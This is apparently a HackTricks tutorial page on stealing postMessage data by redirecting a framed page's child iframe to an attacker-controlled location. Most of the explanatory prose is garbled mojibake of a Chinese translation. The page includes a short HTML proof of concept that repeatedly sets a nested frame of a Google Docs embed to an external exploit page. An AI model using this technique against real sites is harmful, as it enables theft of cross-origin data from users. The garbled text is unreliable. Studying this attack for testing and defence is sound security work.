# Steal postmessage modifying iframe location

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Changing child iframes locations

æ ¹æ®[**è¿™ç¯‡æ–‡ç« **](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/)ï¼Œå¦‚æœä½ å¯ä»¥åœ¨æ²¡æœ‰ X-Frame-Header çš„æƒ…å†µä¸‹å°†ä¸€ä¸ªç½‘é¡µåµŒå…¥ä¸º iframeï¼Œå¹¶ä¸”è¯¥ç½‘é¡µåŒ…å«å¦ä¸€ä¸ª iframeï¼Œä½ å¯ä»¥**æ›´æ”¹è¯¥å­ iframe çš„ä½ç½®**ã€‚

ä¾‹å¦‚ï¼Œå¦‚æœ abc.com å°† efg.com ä½œä¸º iframeï¼Œå¹¶ä¸” abc.com æ²¡æœ‰ X-Frame headerï¼Œæˆ‘å¯ä»¥ä½¿ç”¨ **`frames.location`** å°† efg.com æ›´æ”¹ä¸º evil.com è·¨åŸŸã€‚

è¿™åœ¨ **postMessages** ä¸­ç‰¹åˆ«æœ‰ç”¨ï¼Œå› ä¸ºå¦‚æœä¸€ä¸ªé¡µé¢ä½¿ç”¨ **é€šé…ç¬¦** å‘é€æ•æ„Ÿæ•°æ®ï¼Œä¾‹å¦‚ `windowRef.postmessage("","*")`ï¼Œåˆ™å¯ä»¥**å°†ç›¸å…³ iframeï¼ˆå­æˆ–çˆ¶ï¼‰çš„åœ°å€æ›´æ”¹ä¸ºæ”»å‡»è€…æ§åˆ¶çš„ä½ç½®**å¹¶çªƒå–è¯¥æ•°æ®ã€‚
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
//pseudo code
setTimeout(function(){ exp(); }, 6000);

function exp(){
//needs to modify this every 0.1s as it's not clear when the iframe of the iframe affected is created
setInterval(function(){
window.frames[0].frame[0][2].location="https://geekycat.in/exploit.html";
}, 100);
}
</script>
</html>
```
{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
